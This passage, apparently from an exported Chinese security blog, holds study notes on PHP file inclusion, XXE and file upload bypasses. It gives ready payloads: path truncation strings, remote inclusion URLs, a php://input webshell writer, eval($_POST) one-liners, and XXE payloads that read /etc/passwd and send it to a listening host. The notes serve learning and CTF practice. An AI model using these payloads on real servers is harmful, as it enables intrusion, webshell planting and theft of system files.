1filename&#x3D;test.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F; 点号截断 1filename&#x3D;test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. 远程文件包含包含远程文件，需要满足两个条件。 allow_url_fopen=on, allow_url_include=on。 而且如果是PHP解析的话，包含的文件名后缀不能是.php。 无限制远程文件包含?filename=http://118.xxx/test.txt 有限制远程文件包含同样是有默认后缀限制。也需要想办法截断后缀。 ?filename=http://118.xxx/test.txt? -&gt; 使用问号 ?filename=http://118.xxx/test.txt%23 -&gt; 使用#，注意得编码 ?filename=http://118.xxx/test.txt%20 -&gt; 使用空格，得编码 协议file://协议访问本地文件内容。可绕过对../的限制。 ?filename=file:///etc/passwd php://协议php://filter读取本地磁盘文件。条件：allow_url_fopen=on。 ?filename=php://filter/read=convert.base64-encode/resource=xxx.php ?filename=php://filter/convert.base64-encode/resource=xxx.php 不需要read=也可以。 php://input该协议在enctype=&quot;multipart/form-data&quot;的时候是无效的。条件： allow_url_fopen=on, allow_url_include=on。 在URL中：?filename=php://input, POST数据：&lt;?php phpinfo();?&gt; ​ &lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;&#39;);?&gt; （写入木马） ​ &lt;?php system(&#39;whoami&#39;);?&gt; （命令执行） data://协议读取文件内容。条件：allow_url_include=on。 ?filename=data://text/plain,&lt;?php phpinfo();?&gt; ?filename=data://text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b phar://协议不管文件后缀是什么，都可以当成压缩包解压。用法： 首先将一句话木马写入shell.php，然后压缩得到shell.zip, 将后缀改成shell.png，上传后，使用：?filename=phar://shell.png/shell.php即可。当然需要shell.png上传后的绝对路径。如果被指定了后缀，那么： ?filename=phar://shell.png/shell zip://协议类似phar，但又有所不同。用法： 首先将一句话木马写入shell.php，然后压缩得到shell.zip, 将后缀改成shell.png，上传后，使用：?filename=zip://shell.png%23shell.php。不需要修改后缀直接上传zip文件或者改成其他后缀都可以，注意#需要编码成%23. 如果被指定了默认后缀，那么： filename=zip://shell.png%23shell ../绕过姿势 参考文章 https://www.freebuf.com/articles/web/182280.html https://www.jianshu.com/p/3514f0fd79f7 https://xz.aliyun.com/t/29","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件包含漏洞总结","slug":"文件包含漏洞总结","permalink":"https://ggyggy666.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"xxe漏洞总结","slug":"xxe漏洞总结","date":"2020-07-14T11:57:06.000Z","updated":"2020-07-15T03:23:22.024Z","comments":true,"path":"2020/07/14/xxe漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/14/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"xxe理解起来还是挺难的，涉及知识比较多，今天总结一下。 原理xxe, 外部实体注入，通过构造xml格式的恶意代码传输后被解析执行，得到攻击者想要看到的东西。仅针对外部实体而言。 XML文档结构XML文档结构包括xml声明、DTD文档类型定义、文档元素。 xml声明&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf8&quot;?&gt; DTDDTD包括内部的DOCTYPE声明和外部的DOCTYPE声明。涉及外部的都得使用SYSTEM。 内部 &lt;!DOCTYPE 根元素 [元素或者实体内容]&gt; 外部 &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 然后那个调用的外部文件的内容就是元素或者实体内容。 DTD元素&lt;!ELEMENT 元素名称 &quot;值&quot;&gt; DTD实体DTD实体又分为内部实体、外部实体和参数实体。 内部实体声明 &lt;!ENTITY 实体名称 &quot;实体值&quot;&gt; 外部实体声明 &lt;!ENTITY 实体名称 SYSTEM &quot;外部的URL&quot;&gt; 参数实体声明 内部的参数实体：&lt;!ENTITY %实体名称 &quot;实体值&quot;&gt; 外部的参数实体：&lt;!ENTITY %实体名称 SYSTEM &quot;外部的URL&quot;&gt; 注意，参数实体只能在DTD中引用，而且是使用%实体名称引用。 文档元素（引用实体）前面是声明，这里是引用。这里的文档元素其实只是引用内部或外部实体而已，参数实体在DTD中引用。 引用内外部实体 1234&lt;root&gt; &lt;name&gt;&amp;实体名称;&lt;&#x2F;name&gt; &lt;password&gt;&lt;&#x2F;password&gt;&lt;&#x2F;root&gt; 使用&amp;实体名称;来引用。 引用参数实体 1234&lt;!DOCTYPE note[ &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;%file; &#x2F;&#x2F;引用外部实体]&gt; 使用%实体名称;来引用。参数实体适用于无回显xxe。 判断是否存在xxe 正常传输情况下 查看Content-Type和Accept-Type, 是否是test/xml或者其它与xml相关的。然后构造出xml格式的代码，看返回包的内容。如果发现返回包没有内容，考虑判断无回显xxe。判断的方法可以仅用burp的collaborator。复制好URL后，放到xml代码中： 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY url SYSTEM &quot;http:&#x2F;&#x2F;86cywdrfq1gmblde1pm4dkfmcdi46t.burpcollaborator.net&quot;&gt;]&gt;&lt;login&gt;&amp;url;&lt;&#x2F;login&gt;&#x2F;&#x2F;注意，这个&lt;login&gt;不是随便构造的。是根据传输的数据来添加的。（好像也是可以随便构造的，不太确定..）比如传输的POST型数据：name&#x3D;ggy&amp;password&#x3D;123456.那么就构造出：&lt;root&gt; &lt;name&gt;ggy&lt;&#x2F;name&gt; &lt;&#x2F;password&gt;&amp;url;&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;这个root我不知道是不是随便构造的。&amp;url的位置取决于回显的是哪个数据，不一定就是在password中。JSON格式的类型。 查看是否接收到了请求。 传输数据为JSON格式 将Content-Type: application/json 修改为：application/xml, 然后注入payload。 CTF题目地址 有回显xxe读取文件内容时能够输出在页面。但是注意文件内容如果包含&lt;&gt;&amp;等字符时，会被当成xml解析从而出错。因此应该使用CDATA不让读取的文件内容被解析。 文件内容无&lt;&gt;&amp;等字符 payload 1234567891011121314&#x2F;&#x2F;外部实体poc&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE login [ &lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;login&gt;&amp;name;&lt;&#x2F;login&gt;&#x2F;&#x2F;参数实体poc&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE login [ &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; %name;]&gt; 文件内容包含&lt;&gt;&amp;等字符 构造语句使读取的文件内容在CDATA里面。 payload 12345678910&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;%dtd]&gt;&lt;root&gt;&amp;all;&lt;&#x2F;root&gt; test.dtd的内容 12&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;&gt;&lt;!ENTITY all &quot;%start;%file;%end;&quot;&gt; 无回显xxe也是使用参数实体。CTF题目 引入外部dtd文件payload 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd的内容 123&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt; &amp;#37;就是%, 需要编码才行。 使用nc监听9999端口接收信息。 首先引用remote，调用外部的test.dtd文件，然后用引int，接着引用%file读取到文件后将URL赋给send, 然后引用send从而发送一个请求。就能监听到这个请求从而获取发送过来的经base64加密后的信息。 无需引入外部dtd文件使用三层嵌套。 payload 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % paral SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY % para &#39; &lt;!ENTITY &amp;#X25; para2 &quot;&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;paral;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#39;&gt; %para;]&gt;&lt;message&gt;10&lt;&#x2F;message&gt; 利用本地xxe使用本地的DTD文件。如何查找，看这篇文章。 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM&quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % IS0amso &#39; &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt; %eval; %error; &#39;&gt; %local_dtd;]&gt; xxe执行系统命令123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY f SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;&lt;root&gt;&amp;f;&lt;&#x2F;root&gt; xxe探测内网端口123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY port SYSTEM &quot;http:&#x2F;&#x2F;192.168.3.102:80&quot;&gt;]&gt;&lt;login&gt;&amp;port;&lt;&#x2F;login&gt; 使用burp遍历端口即可。 参考文章 https://www.jianshu.com/p/ec2888780308 https://xz.aliyun.com/t/3357#toc-17 https://xz.aliyun.com/t/6502#toc-20 https://www.jishuwen.com/d/2EGU","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xxe漏洞总结","slug":"xxe漏洞总结","permalink":"https://ggyggy666.github.io/tags/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"文件上传漏洞总结","slug":"文件上传漏洞总结","date":"2020-07-13T07:41:08.000Z","updated":"2020-09-09T13:43:26.436Z","comments":true,"path":"2020/07/13/文件上传漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"生产实习终于结束了，今天总结一下文件上传漏洞。","text":"生产实习终于结束了，今天总结一下文件上传漏洞。 文件上传功能很常见，但是过滤也挺严格的。至今为止，我还未尝在实战中发现一个。因此总结一下一些姿势，希望对日后有所帮助。 原理文件上传漏洞，即在一个可上传文件的地方，对上传的文件没有什么过滤或者过滤不严格，导致上传了包含有恶意代码的文件并且被成功执行从而获取了服务器权限。 常见检验点 客户端js校验 上传的文件后缀校验 上传的文件类型校验 上传的文件头校验 上传的文件内容校验 一句话木马查看PHP信息，检测是否上传成功并执行PHP代码： &lt;?php phpinfo();?&gt; 成功后，再上传能被蚁剑连接的文件，内容为： &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; 使用蚁剑连接，密码就是cmd。 常见漏洞绕过情形 JS绕过 客户端验证了上传文件后缀，可以在firebug中修改前端代码，添加允许的上传类型，或者直接禁用JS。还可以将PHP文件改成允许是文件名后缀，上传同时抓包，再修改回PHP。 文件类型绕过 将Content-Type修改为允许的文件类型，如：image/jpg, image/jpeg, image/png…… 后缀名绕过 尝试不同的后缀名，比如大小写，html | htm | phtml | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等。 IIS默认解析：.asp | .cdx | .asa | .cer 上传.htacess文件绕过 如果没有限制.htacess文件，可先上传，其内容为： 1AddType application&#x2F;x-httpd-php .jpg 该代码意思是，将.jpg结尾的文件当成PHP文件来解析。因此上传了.htaccess文件后，再上传a.jpg文件。 apache就上传.htacess文件，如果是nginx，就上传.user.ini。具体看后面的CTF题目。 利用PHP和windows的特性绕过 先上传一个文件：4.php:.jpg ,会生成一个空的4.php文件。然后再次上传，将文件名修改成：4.&lt; 或 4.&lt;&lt;&lt; 或 4.&gt;&gt;&gt; 或 4.&gt;&gt;&lt;，再次上传，就可以将PHP代码写入4.php文件中。 空格绕过 文件名为：6.php （php后有空格) 点绕过 文件名为：7.php. ::$DATA文件流特性绕过 文件名：8.php::$DATA 点+空格+点绕过 文件名：9.php. . 双写文件名绕过 文件名：10.pphphp 文件路径%00绕过 抓包看到上传的包中，头部有上传的路径，如：?path=/upload,那么可以改为：?path=/upload/11.php%00, 然后上传的文件名还是11.jpg。最后保存的可能就是11.php了。如果路径不在头部，而是在文件名位置的上方，那么可以在11.php的后面加个空格，然后hex中将空格代表的20修改为00. 绕过文件头检测 GIF: GIF89a（47 49 46 38 39 61） jpg: FF D8 FE E0 00 10 4A 46 49 46 png: 89 50 4E 47 例如：GIF89a&lt;?php eval($_POST[&#39;test&#39;]); ?&gt;。 二次渲染绕过 上传图片后，再下载图片，将它与原来的图片进行对比，查看相同的地方，在那个地方插入PHP代码。 二次渲染 条件竞争上传。 上传的文件很快就被删除，利用条件竞争绕过。使用burp的intruder模块，一直爆破发包上传文件，直到删除速度小于上传速度。 条件竞争+Apache解析漏洞 当上传的文件被重命名后，同样尝试条件竞争。如果存在Apache解析漏洞，那么可以上传1.php.7z的文件，然后intruder中不停上传，最后使用解析漏洞访问。利用解析漏洞还可以通关%0a换行符。在burp的hex中在1.php后面加一个0a，然后访问：xxx/1.php%0a。 CVE-2017-15715 条件竞争还可以通过上传的文件内容是写入一个文件来访问那个文件。 123&lt;?php fputs(fopen(&#39;..&#x2F;shell.php&#39;, &#39;w&#39;),&#39;&lt;?php @eval($_POST[a])?&gt;&#39;);?&gt; 0x00截断让 文件名为：1.php .jpg, 然后在hex中将php与.jpg之间的空格改为00即可。 配合文件包含漏洞 